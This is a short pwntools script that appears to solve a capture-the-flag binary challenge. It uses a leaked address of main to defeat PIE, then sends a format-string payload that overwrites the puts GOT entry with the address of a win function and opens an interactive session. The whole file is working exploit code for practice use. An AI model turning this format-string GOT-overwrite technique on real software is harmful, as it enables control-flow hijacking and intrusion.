from pwn import *
# Load the binary
binary = context.binary = ELF('./chall_12')

# Start the process
p = process(binary.path)

#PIE enabled so we need to set the binarys addr with the main leak we get
resp = p.recv()
#parsing the main leak
main_addr_leak = int(re.findall(b"(0x[0-9a-f]{6,16})", resp)[0], 16)
#setting addr
binary.address = main_addr_leak - binary.sym.main

#idk why this is 7 but it works
offset = 7
# Craft the payload to overwrite puts with the address of win
payload = fmtstr_payload(offset, {binary.got.puts: binary.sym.win})
p.sendline(payload)

p.interactive()
